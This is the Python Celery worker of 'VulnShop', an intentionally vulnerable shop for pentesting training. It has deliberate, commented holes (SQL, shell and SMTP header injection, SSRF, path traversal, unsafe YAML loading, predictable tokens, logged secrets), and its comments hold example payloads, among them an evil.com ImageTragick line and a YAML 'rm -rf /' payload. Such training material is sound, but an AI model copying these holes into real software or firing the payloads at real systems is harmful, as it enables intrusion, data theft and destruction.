# VulnShop Celery Worker
# INTENTIONALLY VULNERABLE - For educational/pentesting purposes only
# Vulnerabilities: #51, #52, #58, #68, #161, #204, #230, #355, #369, #410, #559, #657

import os
import re
import json
import time
import random
import string
import smtplib
import hashlib
import logging
import datetime
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path

import requests
import psycopg2
import pymongo
import yaml
from jinja2 import Template, Environment, FileSystemLoader
from celery import Celery
from celery.utils.log import get_task_logger
from dotenv import load_dotenv
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from PIL import Image
import io

load_dotenv()

# Logging setup - VULN #559: Logs may capture sensitive data
logging.basicConfig(
    level=logging.DEBUG,  # VULN: DEBUG level logs everything
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('/tmp/worker.log'),  # VULN: Logs to world-readable tmp
    ]
)
logger = get_task_logger(__name__)

# Configuration
REDIS_URL = os.getenv('REDIS_URL', 'redis://redis:6379/0')
DB_HOST = os.getenv('DB_HOST', 'postgres')
DB_PORT = os.getenv('DB_PORT', '5432')
DB_NAME = os.getenv('DB_NAME', 'vulnshop')
DB_USER = os.getenv('DB_USER', 'postgres')
DB_PASSWORD = os.getenv('DB_PASSWORD', 'postgres123')
MONGO_URL = os.getenv('MONGO_URL', 'mongodb://mongo:27017/vulnshop')
SMTP_HOST = os.getenv('SMTP_HOST', 'mailhog')
SMTP_PORT = int(os.getenv('SMTP_PORT', '1025'))
SMTP_USER = os.getenv('SMTP_USER', '')
SMTP_PASS = os.getenv('SMTP_PASS', '')
FRONTEND_URL = os.getenv('FRONTEND_URL', 'http://localhost:3000')
BACKUP_DIR = os.getenv('BACKUP_DIR', '/var/www/html/backups')  # VULN #410: Web-accessible backup dir
UPLOAD_DIR = os.getenv('UPLOAD_DIR', '/app/uploads')

# Celery app
app = Celery('vulnshop_worker', broker=REDIS_URL, backend=REDIS_URL)

app.conf.update(
    task_serializer='json',
    accept_content=['json'],
    result_serializer='json',
    timezone='UTC',
    enable_utc=True,
    # VULN: Long task result expiry
    result_expires=86400 * 30,
    # VULN: No rate limiting on tasks
    task_always_eager=False,
    worker_hijack_root_logger=False,
)

# Template environment
template_env = Environment(
    loader=FileSystemLoader(
        os.path.join(os.path.dirname(__file__), 'email_templates')
    ),
    # VULN: autoescape disabled - XSS in email templates possible
    autoescape=False,
)


# ─── Database helpers ─────────────────────────────────────────────────────────

def get_db():
    """Get PostgreSQL connection."""
    return psycopg2.connect(
        host=DB_HOST, port=DB_PORT,
        dbname=DB_NAME, user=DB_USER, password=DB_PASSWORD
    )


def db_query(sql, params=None):
    """Execute a query - VULN: Some callers build SQL via string formatting."""
    logger.debug(f'[DB] Query: {sql}')  # VULN #559: SQL logged
    conn = get_db()
    cur = conn.cursor()
    cur.execute(sql, params)
    try:
        rows = cur.fetchall()
        columns = [desc[0] for desc in cur.description] if cur.description else []
        conn.commit()
        cur.close()
        conn.close()
        return [dict(zip(columns, row)) for row in rows]
    except Exception:
        conn.commit()
        cur.close()
        conn.close()
        return []


# ─── Email helper ─────────────────────────────────────────────────────────────

def send_smtp(to_addr, subject, body_html, body_text=None):
    """
    Send email via SMTP (MailHog in dev).
    VULN #161: SMTP injection in `to_addr` and `subject` - no sanitization.
    """
    # VULN #161: No validation/sanitization on to_addr or subject
    # Attacker can inject headers:
    #   to_addr = "victim@example.com\r\nBcc: attacker@evil.com"
    #   subject = "Reset\r\nContent-Type: text/html\r\n\r\n<script>..."
    logger.info(f'[EMAIL] Sending to: {to_addr}, subject: {subject}')  # VULN #559

    msg = MIMEMultipart('alternative')
    # VULN #161: Direct assignment without sanitization
    msg['Subject'] = subject
    msg['From'] = 'noreply@vulnshop.local'
    msg['To'] = to_addr  # VULN: Header injection point

    if body_text:
        msg.attach(MIMEText(body_text, 'plain'))
    msg.attach(MIMEText(body_html, 'html'))

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as smtp:
        # VULN #161: to_addr passed directly - can contain injected recipients
        smtp.sendmail('noreply@vulnshop.local', to_addr, msg.as_string())


# ─── Tasks ────────────────────────────────────────────────────────────────────

@app.task(name='worker.send_email', bind=True, max_retries=3)
def send_email(self, to: str, subject: str, body: str, template: str = None):
    """
    Send a generic email.
    VULN #161: SMTP header injection via `to` and `subject`.
    VULN #559: Full email content logged including sensitive body.
    """
    # VULN #559: Log entire email content
    logger.info(f'[send_email] to={to!r}, subject={subject!r}')
    logger.debug(f'[send_email] body={body!r}')  # VULN: Body may contain PII/tokens

    if template:
        try:
            tmpl = template_env.get_template(template)
            # VULN: Template rendering with user-supplied data (SSTI possible)
            html_body = tmpl.render(body=body, to=to)
        except Exception as e:
            logger.warning(f'Template {template} not found, using raw body: {e}')
            html_body = body
    else:
        html_body = f'<p>{body}</p>'

    try:
        # VULN #161: to and subject passed without sanitization
        send_smtp(to, subject, html_body, body)
        logger.info(f'[send_email] Email sent successfully to {to}')
        return {'status': 'sent', 'to': to, 'subject': subject}
    except Exception as exc:
        logger.error(f'[send_email] Failed: {exc}')
        raise self.retry(exc=exc, countdown=60)


@app.task(name='worker.send_password_reset_email')
def send_password_reset_email(user_email: str, token: str = None):
    """
    Send password reset email.
    VULN #51: Reset token logged.
    VULN #52: Predictable token generation.
    VULN #559: Sensitive data in logs.
    """
    # VULN #52: Predictable token - uses timestamp + simple hash
    if not token:
        timestamp = int(time.time())
        # VULN: Predictable - only based on timestamp
        token = hashlib.md5(f'{user_email}{timestamp}'.encode()).hexdigest()

    # VULN #51, #559: Token logged in plaintext
    logger.info(f'[send_password_reset_email] user={user_email}, token={token}')
    logger.debug(f'[send_password_reset_email] Reset URL: {FRONTEND_URL}/reset?token={token}')

    # VULN: Store token in DB without expiry check (or very long expiry)
    db_query(
        f"UPDATE users SET reset_token = '{token}', reset_token_expires = NOW() + INTERVAL '7 days'"
        f" WHERE email = '{user_email}'"  # VULN: SQLi
    )

    reset_url = f'{FRONTEND_URL}/reset-password?token={token}&email={user_email}'

    try:
        tmpl = template_env.get_template('password_reset.html')
        html_body = tmpl.render(
            reset_url=reset_url,
            user_email=user_email,
            token=token,  # VULN: Token in template context (may render it)
            expires_in='7 days',  # VULN #52: Long expiry
        )
    except Exception:
        html_body = f'<p>Reset your password: <a href="{reset_url}">{reset_url}</a></p>'

    # VULN #161: user_email not sanitized
    send_smtp(user_email, 'Password Reset - VulnShop', html_body)
    return {'status': 'sent', 'email': user_email, 'token': token}  # VULN: Token in return value


@app.task(name='worker.send_order_confirmation')
def send_order_confirmation(order_id: int):
    """Send order confirmation email."""
    logger.info(f'[send_order_confirmation] order_id={order_id}')

    # VULN: SQLi via order_id if not integer
    orders = db_query(f'SELECT * FROM orders WHERE id = {order_id}')
    if not orders:
        logger.error(f'Order {order_id} not found')
        return {'status': 'error', 'message': 'Order not found'}

    order = orders[0]
    # VULN: SQLi
    users = db_query(f"SELECT * FROM users WHERE id = {order.get('user_id')}")
    user = users[0] if users else {}
    # VULN: SQLi
    items = db_query(f'SELECT oi.*, p.name as product_name FROM order_items oi JOIN products p ON oi.product_id = p.id WHERE oi.order_id = {order_id}')

    logger.debug(f'[send_order_confirmation] order={order}, user={user}')  # VULN #559: PII logged

    try:
        tmpl = template_env.get_template('order_confirmation.html')
        html_body = tmpl.render(
            order=order,
            user=user,
            items=items,
            frontend_url=FRONTEND_URL,
        )
    except Exception as e:
        html_body = f'<p>Your order #{order_id} has been confirmed. Total: ${order.get("total")}</p>'

    to_email = user.get('email', '')
    if to_email:
        send_smtp(to_email, f'Order Confirmation #{order_id} - VulnShop', html_body)

    return {'status': 'sent', 'order_id': order_id, 'email': to_email}


@app.task(name='worker.send_verification_email')
def send_verification_email(user_id: int):
    """
    Send email verification.
    VULN #51: Token logged.
    VULN #58: Token reusable indefinitely (no single-use enforcement).
    """
    # VULN: SQLi
    users = db_query(f'SELECT * FROM users WHERE id = {user_id}')
    if not users:
        return {'status': 'error', 'message': 'User not found'}

    user = users[0]

    # VULN #58: Token reusable - generated once, never invalidated after use
    # VULN #52: Predictable
    token = hashlib.sha1(f'{user_id}{user.get("email", "")}'.encode()).hexdigest()

    # VULN #51, #559: Token logged
    logger.info(f'[send_verification_email] user_id={user_id}, email={user.get("email")}, token={token}')

    # VULN #58: Token stored permanently, never marked as used after verification
    db_query(f"UPDATE users SET verification_token = '{token}' WHERE id = {user_id}")

    verify_url = f'{FRONTEND_URL}/verify?token={token}&user_id={user_id}'

    try:
        tmpl = template_env.get_template('verification.html')
        html_body = tmpl.render(
            user=user,
            verify_url=verify_url,
            token=token,
        )
    except Exception:
        html_body = f'<p>Verify your email: <a href="{verify_url}">{verify_url}</a></p>'

    send_smtp(user['email'], 'Verify Your Email - VulnShop', html_body)
    return {'status': 'sent', 'user_id': user_id, 'token': token}  # VULN: Token in return


@app.task(name='worker.process_payment_async', bind=True)
def process_payment_async(self, payment_data: dict):
    """
    Async payment processing.
    VULN #230: Race condition - no distributed locking.
    VULN #309: Amount from client not re-validated.
    VULN #559: Payment data with card info logged.
    """
    # VULN #559: Logging full payment data including card details
    logger.info(f'[process_payment_async] payment_data={json.dumps(payment_data)}')

    order_id = payment_data.get('order_id')
    amount = payment_data.get('amount')      # VULN #309: Amount from client
    card_number = payment_data.get('card_number')
    cvv = payment_data.get('cvv')
    expiry = payment_data.get('expiry')

    # VULN #230: Race condition - no lock acquired before reading order
    # Two simultaneous requests can both proceed with the same order
    orders = db_query(f'SELECT * FROM orders WHERE id = {order_id}')
    if not orders:
        return {'status': 'error', 'message': 'Order not found'}

    order = orders[0]

    # VULN #230: Time-of-check / time-of-use gap
    time.sleep(0.1)  # Simulate processing delay - race window

    if order.get('status') == 'paid':
        # VULN #230: This check can fail under concurrent requests
        logger.warning(f'Order {order_id} already paid - but continuing anyway')
        # Should return error but intentionally continues

    # VULN #309: No re-validation that amount == order total
    # Client sends $0.01 for a $999 order
    logger.warning(f'[process_payment_async] Processing order {order_id} for amount ${amount} (order total: ${order.get("total")})')

    # VULN: SQLi + CVV stored in plaintext (PCI violation)
    db_query(
        f"INSERT INTO payments (order_id, amount, card_number, cvv, expiry_date, status, created_at)"
        f" VALUES ({order_id}, {amount}, '{card_number}', '{cvv}', '{expiry}', 'completed', NOW())"
    )

    # VULN #230: Update order status without atomic lock
    db_query(f"UPDATE orders SET status = 'paid', paid_amount = {amount} WHERE id = {order_id}")

    return {
        'status': 'completed',
        'order_id': order_id,
        'amount': amount,
        'card_last4': str(card_number)[-4:] if card_number else '****',
    }


@app.task(name='worker.generate_invoice')
def generate_invoice(order_id: int, logo_url: str = None):
    """
    Generate PDF invoice for an order.
    VULN #204: SSRF via logo_url - no URL validation.
    VULN #369: Path traversal in output filename.
    VULN #559: Order data with PII logged.
    """
    logger.info(f'[generate_invoice] order_id={order_id}, logo_url={logo_url}')

    # VULN: SQLi
    orders = db_query(f'SELECT o.*, u.email, u.address, u.phone FROM orders o JOIN users u ON o.user_id = u.id WHERE o.id = {order_id}')
    if not orders:
        return {'status': 'error', 'message': 'Order not found'}

    order = orders[0]
    logger.debug(f'[generate_invoice] order data: {order}')  # VULN #559

    items = db_query(f'SELECT oi.*, p.name FROM order_items oi JOIN products p ON oi.product_id = p.id WHERE oi.order_id = {order_id}')

    # VULN #369: Path traversal in filename
    # If order_id is manipulated or comes from user: order_id = "../../etc/passwd"
    # Attacker can write to arbitrary locations
    output_dir = os.path.join(UPLOAD_DIR, 'invoices')
    os.makedirs(output_dir, exist_ok=True)

    # VULN #369: filename constructed from user-controllable data without sanitization
    filename = f'invoice_{order_id}.pdf'          # order_id could be "../../../etc/cron.d/evil"
    filepath = os.path.join(output_dir, filename)  # Path traversal not prevented

    # Build PDF
    c = canvas.Canvas(filepath, pagesize=letter)
    width, height = letter

    # VULN #204: SSRF - logo_url fetched without validation
    # Attacker can supply: logo_url = "http://169.254.169.254/latest/meta-data/"
    # Or internal services: logo_url = "http://internal-service/admin"
    if logo_url:
        try:
            logger.info(f'[generate_invoice] Fetching logo from: {logo_url}')  # VULN: logs SSRF target
            # VULN #204: No URL scheme check, no IP validation, no redirect protection
            response = requests.get(
                logo_url,
                timeout=10,
                allow_redirects=True,   # VULN: Follows redirects (open redirect to SSRF)
                verify=False,            # VULN: TLS verification disabled
            )
            if response.status_code == 200:
                # VULN: Response content returned to PDF (data exfiltration)
                img_data = io.BytesIO(response.content)
                try:
                    img = Image.open(img_data)
                    img_path = f'/tmp/logo_{order_id}.png'
                    img.save(img_path)
                    c.drawImage(img_path, 50, height - 100, width=150, height=60)
                except Exception as img_err:
                    # VULN: Even if not an image, response body goes into error log
                    logger.debug(f'Logo response body (non-image): {response.text[:500]}')
        except Exception as e:
            logger.error(f'[generate_invoice] Logo fetch error: {e}')

    # Draw invoice content
    c.setFont('Helvetica-Bold', 20)
    c.drawString(50, height - 50, f'VulnShop Invoice #{order_id}')
    c.setFont('Helvetica', 12)
    c.drawString(50, height - 150, f'Email: {order.get("email", "")}')
    c.drawString(50, height - 170, f'Address: {order.get("address", "")}')
    c.drawString(50, height - 190, f'Phone: {order.get("phone", "")}')
    c.drawString(50, height - 220, f'Order Total: ${order.get("total", 0)}')
    c.drawString(50, height - 240, f'Status: {order.get("status", "")}')

    y = height - 280
    for item in items:
        c.drawString(50, y, f'- {item.get("name")} x{item.get("quantity")} @ ${item.get("price")}')
        y -= 20

    c.save()

    logger.info(f'[generate_invoice] Invoice saved to {filepath}')
    return {'status': 'created', 'path': filepath, 'filename': filename}


@app.task(name='worker.export_user_data')
def export_user_data(user_id: int):
    """
    GDPR data export.
    VULN #657: Returns ALL user data including sensitive PII fields.
    No access control - any user_id can be exported.
    """
    logger.info(f'[export_user_data] Exporting data for user_id={user_id}')

    # VULN #657: Returns ALL columns including password, cvv, ssn, credit_card
    users = db_query(f'SELECT * FROM users WHERE id = {user_id}')  # VULN: SQLi
    if not users:
        return {'status': 'error', 'message': 'User not found'}

    user = users[0]
    # VULN #657: ALL PII included
    orders = db_query(f'SELECT * FROM orders WHERE user_id = {user_id}')
    payments = db_query(f'SELECT * FROM payments WHERE user_id = {user_id}')  # Card data
    reviews = db_query(f'SELECT * FROM reviews WHERE user_id = {user_id}')

    export_data = {
        'user': user,          # VULN #657: Includes password, ssn, credit_card
        'orders': orders,
        'payments': payments,  # VULN #657: Includes card_number, cvv
        'reviews': reviews,
        'exported_at': datetime.datetime.utcnow().isoformat(),
    }

    # VULN #369: Path traversal in export filename
    export_dir = os.path.join(UPLOAD_DIR, 'exports')
    os.makedirs(export_dir, exist_ok=True)
    filename = f'user_export_{user_id}.json'   # VULN: user_id could be path traversal
    filepath = os.path.join(export_dir, filename)

    with open(filepath, 'w') as f:
        json.dump(export_data, f, indent=2, default=str)

    # VULN #559: Logs full user data
    logger.debug(f'[export_user_data] Export data: {json.dumps(export_data, default=str)[:2000]}')

    return {
        'status': 'exported',
        'user_id': user_id,
        'filepath': filepath,
        'data': export_data,  # VULN #657: Full PII data in task result
    }


@app.task(name='worker.cleanup_sessions')
def cleanup_sessions():
    """
    Cleanup expired sessions.
    VULN #68: Does NOT actually clean up expired sessions.
    Old/expired sessions remain valid indefinitely.
    """
    logger.info('[cleanup_sessions] Running session cleanup...')

    # VULN #68: Query shows expired sessions but does NOT delete them
    expired = db_query(
        "SELECT id, user_id, created_at FROM sessions WHERE expires_at < NOW()"
    )
    logger.info(f'[cleanup_sessions] Found {len(expired)} expired sessions (NOT deleting - vuln #68)')

    # VULN #68: Intentionally skip the actual cleanup
    # Should be: db_query("DELETE FROM sessions WHERE expires_at < NOW()")
    # But we "forget" to run it

    # Also "forget" to clean up expired reset tokens
    # Should be: db_query("UPDATE users SET reset_token = NULL WHERE reset_token_expires < NOW()")

    # Also "forget" to clean up expired refresh tokens
    # Should be: db_query("UPDATE users SET refresh_token = NULL WHERE ...")

    return {
        'status': 'completed',
        'sessions_found': len(expired),
        'sessions_deleted': 0,  # VULN #68: Always 0
        'note': 'Sessions not actually deleted due to vuln #68',
    }


@app.task(name='worker.backup_database')
def backup_database():
    """
    Create a database backup.
    VULN #410: Backup stored in web-accessible public directory.
    Backup filename is predictable.
    VULN #559: DB credentials logged.
    """
    timestamp = datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    # VULN #410: Backup stored in BACKUP_DIR which is web-accessible (/var/www/html/backups)
    # Anyone can download: http://victim.com/backups/vulnshop_backup_20240101_120000.sql
    backup_file = os.path.join(BACKUP_DIR, f'vulnshop_backup_{timestamp}.sql')

    os.makedirs(BACKUP_DIR, exist_ok=True)

    # VULN #559: DB credentials logged
    logger.info(f'[backup_database] Creating backup: {backup_file}')
    logger.debug(f'[backup_database] DB: {DB_USER}:{DB_PASSWORD}@{DB_HOST}/{DB_NAME}')

    # VULN: DB password in environment / command line (visible in /proc)
    env = os.environ.copy()
    env['PGPASSWORD'] = DB_PASSWORD  # Still visible in process list on some systems

    try:
        result = subprocess.run(
            ['pg_dump', '-h', DB_HOST, '-U', DB_USER, '-d', DB_NAME, '-f', backup_file],
            env=env,
            capture_output=True,
            text=True,
            timeout=300,
        )
        if result.returncode != 0:
            logger.error(f'[backup_database] pg_dump failed: {result.stderr}')
            # VULN: Error output may contain sensitive info
            return {'status': 'error', 'stderr': result.stderr}

        # VULN #410: Set world-readable permissions on backup
        os.chmod(backup_file, 0o644)

        file_size = os.path.getsize(backup_file)
        logger.info(f'[backup_database] Backup created: {backup_file} ({file_size} bytes)')

        # VULN #410: Return public URL to backup
        public_url = f'http://vulnshop.local/backups/vulnshop_backup_{timestamp}.sql'
        return {
            'status': 'created',
            'file': backup_file,
            'size': file_size,
            'public_url': public_url,  # VULN #410: Backup accessible publicly
            'timestamp': timestamp,
        }
    except FileNotFoundError:
        # pg_dump not available - create a JSON dump instead
        logger.warning('[backup_database] pg_dump not found, creating JSON dump')
        tables = ['users', 'orders', 'products', 'payments', 'sessions']
        dump = {}
        for table in tables:
            try:
                dump[table] = db_query(f'SELECT * FROM {table}')
            except Exception as e:
                dump[table] = f'Error: {e}'

        json_backup = backup_file.replace('.sql', '.json')
        with open(json_backup, 'w') as f:
            json.dump(dump, f, indent=2, default=str)

        os.chmod(json_backup, 0o644)  # VULN #410: World-readable
        return {
            'status': 'created',
            'file': json_backup,
            'public_url': f'http://vulnshop.local/backups/vulnshop_backup_{timestamp}.json',
            'data': dump,  # VULN: Full DB dump in task result
        }


@app.task(name='worker.process_image')
def process_image(image_path: str, operations: list = None):
    """
    Process an uploaded image.
    VULN #355: ImageMagick vulnerabilities (ImageTragick / command injection).
    VULN #369: Path traversal via image_path.
    """
    # VULN #369: No path traversal check
    # image_path could be: "../../etc/passwd" or "/proc/self/environ"
    logger.info(f'[process_image] Processing: {image_path}')

    # VULN #369: Path traversal - read arbitrary files
    if not os.path.isabs(image_path):
        image_path = os.path.join(UPLOAD_DIR, image_path)

    # Still no normalization - traversal via "uploads/../../../etc/passwd"

    if not os.path.exists(image_path):
        return {'status': 'error', 'message': f'File not found: {image_path}'}

    output_dir = os.path.join(UPLOAD_DIR, 'processed')
    os.makedirs(output_dir, exist_ok=True)

    results = []

    # VULN #355: Using convert (ImageMagick) with user-supplied path
    # ImageTragick: image_path = "MALICIOUS_IMAGE.png" containing:
    #   push graphic-context
    #   viewbox 0 0 640 480
    #   fill 'url(https://evil.com/image.png"|ls -la)'
    #   pop graphic-context
    output_path = os.path.join(output_dir, os.path.basename(image_path))

    try:
        # VULN #355: Shell injection via image_path
        # VULN: subprocess with shell=True and user input
        convert_cmd = f'convert "{image_path}" -resize 800x600 "{output_path}"'
        logger.debug(f'[process_image] Running: {convert_cmd}')
        result = subprocess.run(
            convert_cmd,
            shell=True,           # VULN: shell=True with user input
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0:
            results.append({'operation': 'resize', 'output': output_path})
        else:
            # VULN: Error output returned (may contain path info)
            results.append({'operation': 'resize', 'error': result.stderr})
    except Exception as e:
        results.append({'operation': 'resize', 'error': str(e)})

    # Apply additional operations from request
    if operations:
        for op in operations:
            # VULN #355: Operation parameters not sanitized
            op_name = op.get('name', '')
            op_args = op.get('args', '')  # VULN: Injected args go directly to convert
            try:
                cmd = f'convert "{image_path}" {op_args} "{output_path}"'  # VULN: injection
                subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                results.append({'operation': op_name, 'output': output_path})
            except Exception as e:
                results.append({'operation': op_name, 'error': str(e)})

    # VULN: PIL/Pillow also used - ReDoS via crafted image metadata
    try:
        with Image.open(image_path) as img:
            # VULN: No size check - decompression bomb if huge image
            metadata = {
                'format': img.format,
                'mode': img.mode,
                'size': img.size,
                'info': str(img.info),  # VULN: Raw EXIF data returned
            }
    except Exception as e:
        metadata = {'error': str(e)}

    return {
        'status': 'processed',
        'input': image_path,
        'results': results,
        'metadata': metadata,
    }


@app.task(name='worker.send_bulk_email')
def send_bulk_email(user_ids: list, subject: str, template: str, context: dict = None):
    """
    Send bulk email to multiple users.
    VULN #161: SMTP injection in subject.
    VULN: No rate limiting on bulk sending.
    """
    logger.info(f'[send_bulk_email] Sending to {len(user_ids)} users, subject={subject!r}')
    context = context or {}
    results = []

    for user_id in user_ids:
        users = db_query(f'SELECT * FROM users WHERE id = {user_id}')  # VULN: SQLi, N+1
        if not users:
            continue
        user = users[0]

        try:
            tmpl = template_env.get_template(template)
            # VULN: User-controlled context can cause SSTI
            html_body = tmpl.render(user=user, **context)
            # VULN #161: subject not sanitized
            send_smtp(user['email'], subject, html_body)
            results.append({'user_id': user_id, 'status': 'sent'})
        except Exception as e:
            results.append({'user_id': user_id, 'status': 'error', 'error': str(e)})

    return {'status': 'completed', 'results': results}


@app.task(name='worker.run_report')
def run_report(report_type: str, params: dict = None):
    """
    Run internal reports.
    VULN: SQL injectable report type and params.
    VULN: No auth check - any worker message can trigger.
    """
    params = params or {}
    logger.info(f'[run_report] type={report_type}, params={params}')

    # VULN: report_type directly interpolated into SQL
    sql = f"SELECT * FROM {report_type}"  # VULN: Table name from user input (SQLi)

    if params.get('where'):
        sql += f" WHERE {params['where']}"  # VULN: Direct SQLi

    if params.get('order'):
        sql += f" ORDER BY {params['order']}"  # VULN: SQLi

    try:
        rows = db_query(sql)
        return {'status': 'ok', 'rows': rows, 'count': len(rows)}
    except Exception as e:
        # VULN: DB error message returned
        return {'status': 'error', 'error': str(e), 'sql': sql}


@app.task(name='worker.parse_yaml_config')
def parse_yaml_config(yaml_content: str):
    """
    Parse YAML configuration.
    VULN: Unsafe YAML loading allows arbitrary code execution.
    """
    logger.info(f'[parse_yaml_config] Parsing YAML ({len(yaml_content)} bytes)')
    # VULN: yaml.load without Loader=SafeLoader allows deserialization attacks
    # Attacker payload: "!!python/object/apply:os.system ['rm -rf /']"
    config = yaml.load(yaml_content, Loader=yaml.Loader)  # VULN: Unsafe loader
    return {'status': 'parsed', 'config': config}


if __name__ == '__main__':
    app.start()
